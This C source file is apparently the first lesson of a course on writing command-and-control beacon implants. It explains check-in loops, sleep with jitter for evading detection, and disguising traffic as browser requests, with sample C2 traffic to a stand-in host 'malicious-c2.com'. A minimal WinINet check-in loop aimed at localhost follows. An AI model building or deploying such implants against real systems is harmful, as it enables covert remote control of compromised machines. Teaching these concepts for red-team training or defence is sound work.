/*
 * ========================================
 * LESSON 01: Beacon Concept
 * ========================================
 *
 * WHAT IS A BEACON?
 *
 * A beacon is an implant that:
 * 1. Runs continuously on a compromised system
 * 2. "Calls home" periodically to a C2 server
 * 3. Waits for tasks/commands from the operator
 * 4. Executes received commands
 * 5. Sends results back to the server
 * 6. Returns to sleep until next check-in
 *
 * KEY CHARACTERISTICS:
 * - Asynchronous: Commands are queued, not real-time
 * - Periodic: Check-in happens at intervals (sleep time)
 * - Stealthy: Longer sleep = less network activity = harder to detect
 * - Persistent: Runs until killed or instructed to exit
 *
 * ========================================
 * C2 ARCHITECTURE OVERVIEW
 * ========================================
 *
 *     [OPERATOR]
 *         |
 *         | (Web UI / CLI)
 *         v
 *    [C2 SERVER]
 *         |
 *         | HTTP/HTTPS
 *         | (Periodic check-ins)
 *         v
 *     [BEACON] <-- Running on target machine
 *         |
 *         | (Command execution)
 *         v
 *   [Target System]
 *
 *
 * BEACON LIFECYCLE:
 *
 * 1. INITIALIZATION
 *    - Load configuration (C2 host, port, sleep time, etc.)
 *    - Initial check-in to register with server
 *
 * 2. MAIN LOOP (runs forever)
 *    a) Sleep for configured interval (with jitter)
 *    b) Check-in to C2 server via HTTP GET/POST
 *    c) Receive tasks from server (if any)
 *    d) Execute tasks sequentially
 *    e) Send results back to server
 *    f) Repeat
 *
 * 3. TERMINATION
 *    - Receive "exit" command from server
 *    - Clean up resources
 *    - Self-destruct (optional)
 *
 * ========================================
 * BEACON vs REVERSE SHELL
 * ========================================
 *
 * REVERSE SHELL:
 * - Connects once to C2
 * - Maintains persistent TCP connection
 * - Real-time command execution
 * - Easy to detect (long-lived connection)
 * - Unstable (dies if connection breaks)
 *
 * BEACON:
 * - Connects periodically (every N seconds)
 * - Short-lived HTTP requests
 * - Asynchronous command execution
 * - Harder to detect (looks like normal web traffic)
 * - Stable (survives network interruptions)
 *
 * ========================================
 * COMMUNICATION PROTOCOL
 * ========================================
 *
 * TYPICAL HTTP BEACON FLOW:
 *
 * 1. CHECK-IN (Beacon -> Server)
 *    GET /api/beacon/12345 HTTP/1.1
 *    Host: malicious-c2.com
 *    User-Agent: Mozilla/5.0 ...
 *    Cookie: session=<encrypted_beacon_id>
 *
 * 2. SERVER RESPONSE (Server -> Beacon)
 *    HTTP/1.1 200 OK
 *    Content-Type: application/octet-stream
 *
 *    [Encrypted task data]
 *    {
 *      "task_id": 42,
 *      "command": "shell",
 *      "args": "whoami"
 *    }
 *
 * 3. TASK RESULT (Beacon -> Server)
 *    POST /api/results HTTP/1.1
 *    Host: malicious-c2.com
 *    Content-Type: application/json
 *
 *    {
 *      "task_id": 42,
 *      "output": "NT AUTHORITY\\SYSTEM",
 *      "status": "success"
 *    }
 *
 * ========================================
 * BEACON CONFIGURATION
 * ========================================
 *
 * A beacon needs to know:
 * - Where to connect (C2 host/IP and port)
 * - How often to check-in (sleep time in seconds)
 * - How to vary check-ins (jitter percentage)
 * - What protocol to use (HTTP, HTTPS, DNS, SMB, etc.)
 * - Optional: Encryption keys, user-agent, headers, etc.
 *
 * Example config:
 * {
 *   "host": "malicious-c2.com",
 *   "port": 443,
 *   "sleep": 60,          // Check-in every 60 seconds
 *   "jitter": 20,         // +/- 20% variation (48-72 seconds)
 *   "protocol": "https",
 *   "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ..."
 * }
 *
 * ========================================
 * BASIC BEACON PSEUDOCODE
 * ========================================
 */

#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>

/*
 * BEACON PSEUDOCODE:
 *
 * main() {
 *     // 1. Load configuration
 *     config = LoadBeaconConfig();
 *
 *     // 2. Initial check-in
 *     beacon_id = CheckIn(config);
 *
 *     // 3. Main loop
 *     while (1) {
 *         // Sleep with jitter
 *         sleep_time = CalculateSleep(config.sleep, config.jitter);
 *         Sleep(sleep_time * 1000);
 *
 *         // Check for tasks
 *         task = GetTask(config, beacon_id);
 *
 *         if (task != NULL) {
 *             // Execute task
 *             result = ExecuteTask(task);
 *
 *             // Send result back
 *             SendResult(config, beacon_id, result);
 *         }
 *     }
 * }
 */

/*
 * ========================================
 * SIMPLIFIED BEACON EXAMPLE
 * ========================================
 *
 * This is a MINIMAL beacon to illustrate the concept.
 * Real beacons are much more complex!
 */

typedef struct {
    char host[256];
    int port;
    int sleep_seconds;
    int jitter_percent;
} BEACON_CONFIG;

// Calculate sleep time with jitter
DWORD CalculateSleepTime(int base_sleep, int jitter_percent) {
    if (jitter_percent == 0) {
        return base_sleep * 1000; // No jitter
    }

    // Calculate jitter range: base_sleep +/- (base_sleep * jitter / 100)
    int jitter_range = (base_sleep * jitter_percent) / 100;
    int min_sleep = base_sleep - jitter_range;
    int max_sleep = base_sleep + jitter_range;

    // Random sleep time within range
    int random_sleep = min_sleep + (rand() % (max_sleep - min_sleep + 1));

    printf("[*] Base sleep: %d seconds, Jitter: %d%%, Actual sleep: %d seconds\n",
           base_sleep, jitter_percent, random_sleep);

    return random_sleep * 1000; // Convert to milliseconds
}

// Simplified HTTP check-in
BOOL CheckInToC2(BEACON_CONFIG* config) {
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL result = FALSE;

    // Initialize WinINet
    hInternet = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, NULL, 0
    );

    if (!hInternet) {
        printf("[-] InternetOpenA failed: %d\n", GetLastError());
        return FALSE;
    }

    // Connect to server
    hConnect = InternetConnectA(
        hInternet,
        config->host,
        config->port,
        NULL, NULL,
        INTERNET_SERVICE_HTTP,
        0, 0
    );

    if (!hConnect) {
        printf("[-] InternetConnectA failed: %d\n", GetLastError());
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    // Send HTTP GET request
    hRequest = HttpOpenRequestA(
        hConnect,
        "GET",
        "/api/beacon/check",
        NULL, NULL, NULL,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
        0
    );

    if (!hRequest) {
        printf("[-] HttpOpenRequestA failed: %d\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    // Send request
    if (!HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
        printf("[-] HttpSendRequestA failed: %d\n", GetLastError());
    } else {
        printf("[+] Check-in successful!\n");

        // Read response (tasks would be here)
        char buffer[4096];
        DWORD bytesRead = 0;

        if (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead)) {
            if (bytesRead > 0) {
                buffer[bytesRead] = '\0';
                printf("[+] Server response: %s\n", buffer);
            } else {
                printf("[*] No tasks received\n");
            }
        }

        result = TRUE;
    }

    // Clean up
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return result;
}

/*
 * ========================================
 * DEMONSTRATION: BASIC BEACON LOOP
 * ========================================
 */
int main(void) {
    printf("========================================\n");
    printf("BEACON CONCEPT DEMONSTRATION\n");
    printf("========================================\n\n");

    // Initialize beacon configuration
    BEACON_CONFIG config = {0};
    strcpy(config.host, "127.0.0.1");  // Localhost for demo
    config.port = 8080;
    config.sleep_seconds = 5;          // 5 seconds for demo (real beacons: 60-300s)
    config.jitter_percent = 20;        // +/- 20% variation

    printf("[*] Beacon Configuration:\n");
    printf("    Host: %s\n", config.host);
    printf("    Port: %d\n", config.port);
    printf("    Sleep: %d seconds\n", config.sleep_seconds);
    printf("    Jitter: %d%%\n\n", config.jitter_percent);

    // Seed random number generator for jitter
    srand((unsigned int)GetTickCount());

    printf("[*] Starting beacon main loop...\n");
    printf("[*] Press Ctrl+C to stop\n\n");

    // Main beacon loop (run 5 times for demo, real beacons loop forever)
    for (int i = 0; i < 5; i++) {
        printf("--- Check-in #%d ---\n", i + 1);

        // Calculate sleep time with jitter
        DWORD sleep_ms = CalculateSleepTime(config.sleep_seconds, config.jitter_percent);

        // Sleep before check-in
        printf("[*] Sleeping for %d ms...\n", sleep_ms);
        Sleep(sleep_ms);

        // Check-in to C2 server
        printf("[*] Checking in to C2...\n");
        if (!CheckInToC2(&config)) {
            printf("[-] Check-in failed (server not running - this is expected for demo)\n");
        }

        printf("\n");
    }

    printf("[*] Demo complete!\n");
    printf("\n");

    /*
     * KEY TAKEAWAYS:
     *
     * 1. A beacon is a periodic check-in implant, not a persistent shell
     * 2. Sleep + Jitter makes detection harder (varies timing)
     * 3. HTTP/HTTPS makes traffic blend in with normal web browsing
     * 4. Asynchronous execution: operator queues tasks, beacon executes later
     * 5. Main loop: Sleep -> Check-in -> Execute -> Report -> Repeat
     *
     * NEXT STEPS:
     * - Lesson 02: Design BEACON_CONFIG structure
     * - Lesson 03: Implement proper sleep loop with jitter
     * - Lesson 04: Parse task responses from server
     */

    return 0;
}

/*
 * ========================================
 * COMPILATION & EXECUTION
 * ========================================
 *
 * Compile:
 *   cl.exe 01-beacon-concept.c /link wininet.lib
 *
 * Run:
 *   01-beacon-concept.exe
 *
 * Expected output:
 *   - Shows beacon config
 *   - Demonstrates sleep with jitter (varying times)
 *   - Attempts check-in (will fail without server, that's OK)
 *   - Repeats 5 times
 *
 * ========================================
 */
